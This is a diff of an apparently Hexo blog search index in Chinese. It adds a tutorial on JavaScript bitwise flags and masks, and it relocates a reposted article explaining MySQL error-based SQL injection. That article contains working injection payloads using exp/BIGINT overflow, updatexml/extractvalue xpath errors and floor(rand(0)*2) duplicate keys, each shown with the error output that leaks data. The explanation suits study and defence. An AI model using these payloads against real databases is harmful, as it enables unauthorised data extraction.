@@ -3,6 +3,52 @@
   
     
     <entry>
+      <title><![CDATA[[整理]【位运算经典应用】 标志位与掩码]]></title>
+      <url>/2018/04/06/mask-code/</url>
+      <content type="html"><![CDATA[<h3 id="整理-【位运算经典应用】-标志位与掩码"><a href="#整理-【位运算经典应用】-标志位与掩码" class="headerlink" title="[整理]【位运算经典应用】 标志位与掩码"></a>[整理]【位运算经典应用】 标志位与掩码</h3><blockquote>
+<p>本文原文来源自 <a href="http://www.cnblogs.com/zichi/p/4792589.html" target="_blank" rel="noopener">http://www.cnblogs.com/zichi/p/4792589.html</a></p>
+<p>相关内容经过整理, ABCD几个水果单词更加容易对应起来</p>
+</blockquote>
+<p>前面我们已经了解了六大位操作符（<code>&amp;</code> <code>|</code> <code>~</code> <code>^</code> <code>&lt;&lt;</code> <code>&gt;&gt;</code>)的用法（<a href="http://www.cnblogs.com/zichi/p/4787145.html" target="_blank" rel="noopener">javascript 位运算</a>），也整理了一些常用的位运算操作（<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a>），本文我们继续深入位运算，来了解下二进制的经典应用-标志位与掩码。</p>
+<p>位运算经常被用来创建、处理以及读取标志位序列——一种类似二进制的变量。虽然可以使用变量代替标志位序列，但是这样可以节省内存（1/32）。</p>
+<p>例如有4个标志位：</p>
+<ol>
+<li>标志位A： 我们有 Apple</li>
+<li>标志位B： 我们有 Banana</li>
+<li>标志位C： 我们有 Cherry</li>
+<li>标志位D： 我们有 Dew</li>
+</ol>
+<p>标志位通过位序列DCBA来表示，当一个位置被置为1时，表示有该项，置为0时，表示没有该项。例如一个变量flag=9，二进制表示为1001，就表示我们有D和A。</p>
+<p>掩码 (bitmask) 是一个通过与/或来读取标志位的位序列。典型的定义每个标志位的原语掩码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> FLAG_A = <span class="number">1</span>; <span class="comment">// 0001</span></span><br><span class="line"><span class="keyword">var</span> FLAG_B = <span class="number">2</span>; <span class="comment">// 0010</span></span><br><span class="line"><span class="keyword">var</span> FLAG_C = <span class="number">4</span>; <span class="comment">// 0100</span></span><br><span class="line"><span class="keyword">var</span> FLAG_D = <span class="number">8</span>; <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>新的掩码可以在以上掩码上使用逻辑运算创建。例如，掩码 1011 可以通过 FLAG_A、FLAG_B 和 FLAG_D 逻辑或得到：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mask = FLAG_A | FLAG_B | FLAG_D; <span class="comment">// 0001 | 0010 | 1000 =&gt; 1011</span></span><br></pre></td></tr></table></figure>
+<p>某个特定的位可以通过与掩码做逻辑与运算得到，通过与掩码的与运算可以去掉无关的位，得到特定的位。例如，掩码 0100 可以用来检查标志位 C 是否被置位：（<strong>核心就是判断某位上的数</strong> 参考<a href="http://www.cnblogs.com/zichi/p/4789439.html" target="_blank" rel="noopener">常用位运算整理</a> 下同）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Cherry</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FLAG_C) &#123; <span class="comment">// 0101 &amp; 0100 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个有多个位被置位的掩码表达任一/或者的含义。例如，以下两个表达是等价的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们有 Banana 或者 Cherry 至少一个</span></span><br><span class="line"><span class="comment">// (0101 &amp; 0010) || (0101 &amp; 0100) =&gt; 0000 || 0100 =&gt; true</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; FLAG_B) || (flags &amp; FLAG_C)) &#123;</span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C; <span class="comment">// 0010 | 0100 =&gt; 0110</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; mask) &#123; <span class="comment">// 0101 &amp; 0110 =&gt; 0100 =&gt; true</span></span><br><span class="line">   <span class="comment">// do stuff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以通过与掩码做或运算设置标志位，掩码中为 1 的位可以设置对应的位。例如掩码 1100 可用来设置位 C 和 D：（<strong>核心就是将某位变为1</strong> ）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们有 Cherry 和 Dew</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_C | FLAG_D; <span class="comment">// 0100 | 1000 =&gt; 1100</span></span><br><span class="line">flags |= mask;   <span class="comment">// 0101 | 1100 =&gt; 1101</span></span><br></pre></td></tr></table></figure>
+<p>可以通过与掩码做与运算清除标志位，掩码中为 0 的位可以设置对应的位。掩码可以通过对原语掩码做非运算得到。例如，掩码 1010 可以用来清除标志位 A 和 C ：（<strong>核心就是将某位变为0</strong>）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~(FLAG_A | FLAG_C); <span class="comment">// ~0101 =&gt; 1010</span></span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure>
+<p>如上的掩码同样可以通过 ~FLAG_A &amp; ~FLAG_C 得到（德摩根定律）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们没有 Apple 也没有 Cherry</span></span><br><span class="line"><span class="keyword">var</span> mask = ~FLAG_A &amp; ~FLAG_C;</span><br><span class="line">flags &amp;= mask;   <span class="comment">// 1101 &amp; 1010 =&gt; 1000</span></span><br></pre></td></tr></table></figure>
+<p>标志位可以使用异或运算切换。所有值为 1 的为可以切换对应的位。例如，掩码 0110 可以用来切换标志位 B 和 C：（<strong>核心就是将某位取反</strong>）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果我们以前没有 Banana ，那么我们现在有 Banana</span></span><br><span class="line"><span class="comment">// 但是如果我们已经有了一个，那么现在没有了</span></span><br><span class="line"><span class="comment">// 对 Cherry 也是相同的情况</span></span><br><span class="line"><span class="keyword">var</span> mask = FLAG_B | FLAG_C;</span><br><span class="line">flags = flags ^ mask;   <span class="comment">// 1100 ^ 0110 =&gt; 1010</span></span><br></pre></td></tr></table></figure>
+<p>最后，所有标志位可以通过非运算翻转：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entering parallel universe...</span></span><br><span class="line">flags = ~flags;    <span class="comment">// ~1010 =&gt; 0101</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> mask </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[[整理] 写出健壮的Shell脚本及Shell异常处理]]></title>
       <url>/2018/03/18/stronger-shell/</url>
       <content type="html"><![CDATA[<p>许多人用shell脚本完成一些简单任务，而且变成了他们生命的一部分。不幸的是，shell脚本在运行异常时会受到非常大的影响。在写脚本时将这类问题最小化是十分必要的。本文中我将介绍一些让bash脚本变得健壮的技术。</p>
@@ -209,159 +255,6 @@
         <tags>
             
             <tag> PHP PHPstorm IDE </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[[转] Mysql注入后利用]]></title>
-      <url>/2018/01/06/mysql-injection/</url>
-      <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
-<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
-<ol>
-<li>BIGINT等数据类型溢出</li>
-<li>xpath语法错误</li>
-<li>concat+rand()+group_by()导致主键重复</li>
-<li>一些特性</li>
-</ol>
-<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
-<a id="more"></a>
-<h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">
-                </div>
-                <div class="image-caption">img</div>
-            </figure>
-<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure>
-<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure>
-<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>同理，利用exp函数也会产生类似的溢出错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</span><br></pre></td></tr></table></figure>
-<p>注入姿势：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
-<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
-<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
-<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&apos;/a/b&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
-<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
-<ul>
-<li>先是建立虚拟表，其中key为主键，不可重复：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-<tr>
-<td>tom</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-<tr>
-<td>tom</td>
-<td>1</td>
-</tr>
-<tr>
-<td>candy</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
-      
-        
-        <tags>
-            
-            <tag> mysql </tag>
-            
-            <tag> sql </tag>
-            
-            <tag> injection </tag>
             
         </tags>
         
@@ -728,6 +621,159 @@
             <tag> security </tag>
             
             <tag> hack </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[[转] Mysql注入后利用]]></title>
+      <url>/2018/01/06/mysql-injection/</url>
+      <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
+<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
+<ol>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>一些特性</li>
+</ol>
+<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
+<a id="more"></a>
+<h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure>
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure>
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</span><br></pre></td></tr></table></figure>
+<p>注入姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
+<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
